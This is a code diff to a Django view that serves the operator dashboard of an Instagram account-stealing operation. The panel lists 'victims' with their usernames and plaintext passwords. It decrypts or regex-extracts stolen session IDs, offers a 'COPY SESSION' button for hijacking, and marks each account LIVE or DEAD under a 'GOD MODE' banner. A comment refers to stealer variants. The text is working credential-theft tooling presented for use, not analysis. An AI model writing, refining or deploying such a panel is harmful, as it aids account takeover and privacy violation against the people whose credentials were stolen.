@@ -61,7 +61,6 @@ def login_view(request):
             "active": success
         })
 
-
 def dashboard(request):
     victims = []
     total = InstagramAccount.objects.count()
@@ -72,54 +71,53 @@ def dashboard(request):
         try:
             decrypted = fernet.decrypt(acc.session_data.encode()).decode()
             data = json.loads(decrypted)
-            sessionid = data.get("authorization_data", {}).get("sessionid") or \
-                       data.get("sessionid") or "ENCRYPTED"
-        except:
-            # PC-STEALER / REEL / SILENT — RAW SESSION
+            sessionid = data.get("authorization_data", {}).get("sessionid") or data.get("sessionid", "NO_ID")
+        except Exception as e:
             try:
                 raw = acc.session_data
                 match = re.search(r'"sessionid"\s*:\s*"([^"]+)"', raw)
-                if match:
-                    sessionid = match.group(1)
-                else:
-                    sessionid = "STOLEN_SESSION"
+                sessionid = match.group(1) if match else "STOLEN_RAW"
             except:
-                sessionid = "ERROR"
+                sessionid = "DECRYPT_FAILED"
 
         victims.append({
-            "username": acc.username or "UNKNOWN_GOD",
-            "password": acc.password or "STOLEN",
-            "sessionid": sessionid[:120] + "..." if len(sessionid) > 120 else sessionid,
+            "username": getattr(acc, 'username', 'UNKNOWN'),
+            "password": getattr(acc, 'password', 'STOLEN'),
+            "sessionid": str(sessionid)[:150] + "..." if len(str(sessionid)) > 150 else str(sessionid),
             "active": acc.is_active,
-            "time": acc.created_at.strftime("%b %d %H:%M")
+            "time": acc.created_at.strftime("%b %d %H:%M") if acc.created_at else "NOW"
         })
 
     cards = ""
     for v in victims:
-        color = "border-lime-500" if v["active"] else "border-red-600"
-        js = f"navigator.clipboard.writeText('{v['sessionid']}');this.innerText='COPIED';setTimeout(()=>this.innerText='COPY',1500)"
         cards += f'''
-        <div class="bg-gray-900 {color} border-4 rounded-xl p-6 hover:scale-105 transition-all">
+        <div class="bg-gray-900 border-4 {'border-green-500' if v['active'] else 'border-red-700'} rounded-xl p-6">
             <h3 class="text-3xl font-bold text-cyan-400">@{v["username"]}</h3>
             <p class="text-yellow-300">Pass: {v["password"]}</p>
-            <p class="text-gray-400 text-sm">{v["time"]}</p>
-            <button onclick="{js}" class="mt-3 bg-gradient-to-r from-green-600 to-teal-700 px-6 py-3 rounded-lg font-bold">
+            <p class="text-gray-500">{v["time"]}</p>
+            <button onclick="navigator.clipboard.writeText('{v['sessionid']}');this.innerText='COPIED'" 
+                    class="mt-4 bg-green-600 hover:bg-green-700 px-6 py-3 rounded font-bold">
                 COPY SESSION
             </button>
-            <p class="mt-2 text-xl font-bold {'text-green-400' if v['active'] else 'text-red-500'}">
+            <p class="mt-2 text-2xl font-bold {'text-green-400' if v['active'] else 'text-red-500'}">
                 {'LIVE' if v['active'] else 'DEAD'}
             </p>
         </div>'''
 
     html = f'''<!DOCTYPE html>
 <html class="bg-black text-white">
-<head><script src="https://cdn.tailwindcss.com"></script></head>
+<head>
+    <title>GOD MODE</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
 <body class="p-10">
-    <h1 class="text-8xl text-center font-bold bg-gradient-to-r from-red-600 to-purple-600 bg-clip-text text-transparent">
-        GOD MODE DASHBOARD
+    <h1 class="text-8xl text-center font-bold bg-gradient-to-r from-red-600 to-purple-600 bg-clip-text text-transparent mb-8">
+        GOD MODE ACTIVE
     </h1>
-    <div class="text-center text-5xl mt-8">TOTAL: <span class="text-green-400">{total}</span> | LIVE: <span class="text-lime-400">{active}</span></div>
-    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 mt-16">
+    <div class="text-center text-5xl mb-10">
+        TOTAL: <span class="text-green-400">{total}</span> | LIVE: <span class="text-lime-400">{active}</span>
+    </div>
+    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 max-w-7xl mx-auto">
         {cards or "<div class='col-span-3 text-center text-6xl text-red-600'>NO VICTIMS YET</div>"}
     </div>
     <div class="text-center mt-20">
